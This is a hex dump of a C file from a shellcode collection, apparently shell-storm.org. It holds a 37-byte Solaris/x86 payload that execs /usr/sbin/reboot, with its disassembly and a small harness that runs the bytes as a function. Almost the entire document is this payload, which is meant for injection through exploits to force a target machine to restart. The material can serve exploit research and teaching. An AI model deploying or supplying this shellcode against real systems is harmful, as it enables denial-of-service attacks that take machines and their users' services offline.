00000000  2f 2a 0a 54 69 74 6c 65  3a 20 20 20 53 6f 6c 61  |/*.Title:   Sola|
00000010  72 69 73 2f 78 38 36 20  2d 20 52 65 62 6f 6f 74  |ris/x86 - Reboot|
00000020  28 29 20 2d 20 33 37 20  62 79 74 65 73 0a 41 75  |() - 37 bytes.Au|
00000030  74 68 6f 72 3a 20 20 4a  6f 6e 61 74 68 61 6e 20  |thor:  Jonathan |
00000040  53 61 6c 77 61 6e 20 3c  73 75 62 6d 69 74 21 73  |Salwan <submit!s|
00000050  68 65 6c 6c 2d 73 74 6f  72 6d 2e 6f 72 67 3e 0a  |hell-storm.org>.|
00000060  57 65 62 3a 20 20 20 20  20 68 74 74 70 3a 2f 2f  |Web:     http://|
00000070  77 77 77 2e 73 68 65 6c  6c 2d 73 74 6f 72 6d 2e  |www.shell-storm.|
00000080  6f 72 67 0a 54 77 69 74  74 65 72 3a 20 68 74 74  |org.Twitter: htt|
00000090  70 3a 2f 2f 74 77 69 74  74 65 72 2e 63 6f 6d 2f  |p://twitter.com/|
000000a0  6a 6f 6e 61 74 68 61 6e  73 61 6c 77 61 6e 0a 0a  |jonathansalwan..|
000000b0  44 61 74 65 3a 09 20 32  30 31 30 2d 30 35 2d 32  |Date:. 2010-05-2|
000000c0  31 0a 54 65 73 74 65 64  3a 20 20 53 75 6e 4f 53  |1.Tested:  SunOS|
000000d0  20 6f 70 65 6e 73 6f 6c  61 72 69 73 20 35 2e 31  | opensolaris 5.1|
000000e0  31 20 73 6e 76 5f 31 31  31 62 20 69 38 36 70 63  |1 snv_111b i86pc|
000000f0  20 69 33 38 36 20 69 38  36 70 63 20 53 6f 6c 61  | i386 i86pc Sola|
00000100  72 69 73 0a 0a 21 44 61  74 61 62 61 73 65 20 6f  |ris..!Database o|
00000110  66 20 53 68 65 6c 6c 63  6f 64 65 73 20 68 74 74  |f Shellcodes htt|
00000120  70 3a 2f 2f 77 77 77 2e  73 68 65 6c 6c 2d 73 74  |p://www.shell-st|
00000130  6f 72 6d 2e 6f 72 67 2f  73 68 65 6c 6c 63 6f 64  |orm.org/shellcod|
00000140  65 2f 0a 0a 0a 44 65 73  63 72 69 70 74 69 6f 6e  |e/...Description|
00000150  3a 0a 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 0a 0a  |:.------------..|
00000160  20 54 68 65 20 72 65 62  6f 6f 74 20 75 74 69 6c  | The reboot util|
00000170  69 74 79 20 72 65 73 74  61 72 74 73 20 74 68 65  |ity restarts the|
00000180  20 6b 65 72 6e 65 6c 2e  20 54 68 65 20 6b 65 72  | kernel. The ker|
00000190  6e 65 6c 20 69 73 20 6c  6f 61 64 65 64 0a 20 69  |nel is loaded. i|
000001a0  6e 74 6f 20 20 6d 65 6d  6f 72 79 20 62 79 20 74  |nto  memory by t|
000001b0  68 65 20 50 52 4f 4d 20  6d 6f 6e 69 74 6f 72 2c  |he PROM monitor,|
000001c0  20 77 68 69 63 68 20 74  72 61 6e 73 66 65 72 73  | which transfers|
000001d0  20 63 6f 6e 74 72 6f 6c  20 74 6f 0a 20 74 68 65  | control to. the|
000001e0  20 6c 6f 61 64 65 64 20  6b 65 72 6e 65 6c 2e 0a  | loaded kernel..|
000001f0  0a 0a 0a 44 69 73 61 73  73 65 6d 62 6c 79 20 69  |...Disassembly i|
00000200  6e 66 6f 72 6d 61 74 69  6f 6e 73 3a 0a 2d 2d 2d  |nformations:.---|
00000210  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
00000220  2d 2d 2d 2d 2d 2d 0a 0a  73 65 63 74 69 6f 6e 20  |------..section |
00000230  2e 74 65 78 74 0a 20 20  20 20 30 78 38 30 34 38  |.text.    0x8048|
00000240  30 37 34 3a 20 20 20 20  20 20 20 20 20 20 20 20  |074:            |
00000250  20 20 33 31 20 63 30 20  20 20 20 20 20 20 20 20  |  31 c0         |
00000260  20 20 20 20 20 78 6f 72  6c 20 20 20 25 65 61 78  |     xorl   %eax|
00000270  2c 25 65 61 78 0a 20 20  20 20 30 78 38 30 34 38  |,%eax.    0x8048|
00000280  30 37 36 3a 20 20 20 20  20 20 20 20 20 20 20 20  |076:            |
00000290  20 20 35 30 20 20 20 20  20 20 20 20 20 20 20 20  |  50            |
000002a0  20 20 20 20 20 70 75 73  68 6c 20 20 25 65 61 78  |     pushl  %eax|
000002b0  0a 20 20 20 20 30 78 38  30 34 38 30 37 37 3a 20  |.    0x8048077: |
000002c0  20 20 20 20 20 20 20 20  20 20 20 20 20 36 38 20  |             68 |
000002d0  36 32 20 36 66 20 36 66  20 37 34 20 20 20 20 20  |62 6f 6f 74     |
000002e0  70 75 73 68 6c 20 20 24  30 78 37 34 36 66 36 66  |pushl  $0x746f6f|
000002f0  36 32 0a 20 20 20 20 30  78 38 30 34 38 30 37 63  |62.    0x804807c|
00000300  3a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 36  |:              6|
00000310  38 20 36 65 20 32 66 20  37 32 20 36 35 20 20 20  |8 6e 2f 72 65   |
00000320  20 20 70 75 73 68 6c 20  20 24 30 78 36 35 37 32  |  pushl  $0x6572|
00000330  32 66 36 65 0a 20 20 20  20 30 78 38 30 34 38 30  |2f6e.    0x80480|
00000340  38 31 3a 20 20 20 20 20  20 20 20 20 20 20 20 20  |81:             |
00000350  20 36 38 20 32 66 20 37  33 20 36 32 20 36 39 20  | 68 2f 73 62 69 |
00000360  20 20 20 20 70 75 73 68  6c 20 20 24 30 78 36 39  |    pushl  $0x69|
00000370  36 32 37 33 32 66 0a 20  20 20 20 30 78 38 30 34  |62732f.    0x804|
00000380  38 30 38 36 3a 20 20 20  20 20 20 20 20 20 20 20  |8086:           |
00000390  20 20 20 36 38 20 32 66  20 37 35 20 37 33 20 37  |   68 2f 75 73 7|
000003a0  32 20 20 20 20 20 70 75  73 68 6c 20 20 24 30 78  |2     pushl  $0x|
000003b0  37 32 37 33 37 35 32 66  0a 20 20 20 20 30 78 38  |7273752f.    0x8|
000003c0  30 34 38 30 38 62 3a 20  20 20 20 20 20 20 20 20  |04808b:         |
000003d0  20 20 20 20 20 38 39 20  65 33 20 20 20 20 20 20  |     89 e3      |
000003e0  20 20 20 20 20 20 20 20  6d 6f 76 6c 20 20 20 25  |        movl   %|
000003f0  65 73 70 2c 25 65 62 78  0a 20 20 20 20 30 78 38  |esp,%ebx.    0x8|
00000400  30 34 38 30 38 64 3a 20  20 20 20 20 20 20 20 20  |04808d:         |
00000410  20 20 20 20 20 35 30 20  20 20 20 20 20 20 20 20  |     50         |
00000420  20 20 20 20 20 20 20 20  70 75 73 68 6c 20 20 25  |        pushl  %|
00000430  65 61 78 0a 20 20 20 20  30 78 38 30 34 38 30 38  |eax.    0x804808|
00000440  65 3a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |e:              |
00000450  35 33 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |53              |
00000460  20 20 20 70 75 73 68 6c  20 20 25 65 62 78 0a 20  |   pushl  %ebx. |
00000470  20 20 20 30 78 38 30 34  38 30 38 66 3a 20 20 20  |   0x804808f:   |
00000480  20 20 20 20 20 20 20 20  20 20 20 38 39 20 65 31  |           89 e1|
00000490  20 20 20 20 20 20 20 20  20 20 20 20 20 20 6d 6f  |              mo|
000004a0  76 6c 20 20 20 25 65 73  70 2c 25 65 63 78 0a 20  |vl   %esp,%ecx. |
000004b0  20 20 20 30 78 38 30 34  38 30 39 31 3a 20 20 20  |   0x8048091:   |
000004c0  20 20 20 20 20 20 20 20  20 20 20 35 30 20 20 20  |           50   |
000004d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 70 75  |              pu|
000004e0  73 68 6c 20 20 25 65 61  78 0a 20 20 20 20 30 78  |shl  %eax.    0x|
000004f0  38 30 34 38 30 39 32 3a  20 20 20 20 20 20 20 20  |8048092:        |
00000500  20 20 20 20 20 20 35 31  20 20 20 20 20 20 20 20  |      51        |
00000510  20 20 20 20 20 20 20 20  20 70 75 73 68 6c 20 20  |         pushl  |
00000520  25 65 63 78 0a 20 20 20  20 30 78 38 30 34 38 30  |%ecx.    0x80480|
00000530  39 33 3a 20 20 20 20 20  20 20 20 20 20 20 20 20  |93:             |
00000540  20 35 33 20 20 20 20 20  20 20 20 20 20 20 20 20  | 53             |
00000550  20 20 20 20 70 75 73 68  6c 20 20 25 65 62 78 0a  |    pushl  %ebx.|
00000560  20 20 20 20 30 78 38 30  34 38 30 39 34 3a 20 20  |    0x8048094:  |
00000570  20 20 20 20 20 20 20 20  20 20 20 20 62 30 20 30  |            b0 0|
00000580  62 20 20 20 20 20 20 20  20 20 20 20 20 20 20 6d  |b              m|
00000590  6f 76 62 20 20 20 24 30  78 62 2c 25 61 6c 0a 20  |ovb   $0xb,%al. |
000005a0  20 20 20 30 78 38 30 34  38 30 39 36 3a 20 20 20  |   0x8048096:   |
000005b0  20 20 20 20 20 20 20 20  20 20 20 35 30 20 20 20  |           50   |
000005c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 70 75  |              pu|
000005d0  73 68 6c 20 20 25 65 61  78 0a 20 20 20 20 30 78  |shl  %eax.    0x|
000005e0  38 30 34 38 30 39 37 3a  20 20 20 20 20 20 20 20  |8048097:        |
000005f0  20 20 20 20 20 20 63 64  20 39 31 20 20 20 20 20  |      cd 91     |
00000600  20 20 20 20 20 20 20 20  20 69 6e 74 20 20 20 20  |         int    |
00000610  24 30 78 39 31 0a 0a 2a  2f 0a 0a 23 69 6e 63 6c  |$0x91..*/..#incl|
00000620  75 64 65 20 3c 73 74 64  69 6f 2e 68 3e 0a 0a 63  |ude <stdio.h>..c|
00000630  68 61 72 20 73 63 5b 5d  20 3d 20 22 5c 78 33 31  |har sc[] = "\x31|
00000640  5c 78 63 30 5c 78 35 30  5c 78 36 38 5c 78 36 32  |\xc0\x50\x68\x62|
00000650  5c 78 36 66 5c 78 36 66  5c 78 37 34 5c 78 36 38  |\x6f\x6f\x74\x68|
00000660  5c 78 36 65 22 0a 20 20  20 20 20 20 20 20 20 20  |\x6e".          |
00000670  20 20 22 5c 78 32 66 5c  78 37 32 5c 78 36 35 5c  |  "\x2f\x72\x65\|
00000680  78 36 38 5c 78 32 66 5c  78 37 33 5c 78 36 32 5c  |x68\x2f\x73\x62\|
00000690  78 36 39 5c 78 36 38 5c  78 32 66 22 0a 20 20 20  |x69\x68\x2f".   |
000006a0  20 20 20 20 20 20 20 20  20 22 5c 78 37 35 5c 78  |         "\x75\x|
000006b0  37 33 5c 78 37 32 5c 78  38 39 5c 78 65 33 5c 78  |73\x72\x89\xe3\x|
000006c0  35 30 5c 78 35 33 5c 78  38 39 5c 78 65 31 5c 78  |50\x53\x89\xe1\x|
000006d0  35 30 22 0a 20 20 20 20  20 20 20 20 20 20 20 20  |50".            |
000006e0  22 5c 78 35 31 5c 78 35  33 5c 78 62 30 5c 78 30  |"\x51\x53\xb0\x0|
000006f0  62 5c 78 35 30 5c 78 63  64 5c 78 39 31 22 3b 0a  |b\x50\xcd\x91";.|
00000700  0a 0a 69 6e 74 20 6d 61  69 6e 28 76 6f 69 64 29  |..int main(void)|
00000710  0a 7b 0a 20 20 20 20 20  20 20 20 66 70 72 69 6e  |.{.        fprin|
00000720  74 66 28 73 74 64 6f 75  74 2c 22 4c 65 6e 67 74  |tf(stdout,"Lengt|
00000730  68 3a 20 25 64 5c 6e 22  2c 73 74 72 6c 65 6e 28  |h: %d\n",strlen(|
00000740  73 63 29 29 3b 0a 20 20  20 20 20 20 20 20 28 2a  |sc));.        (*|
00000750  28 76 6f 69 64 28 2a 29  28 29 29 20 73 63 29 28  |(void(*)()) sc)(|
00000760  29 3b 0a 0a 72 65 74 75  72 6e 20 30 3b 0a 7d     |);..return 0;.}|
0000076f
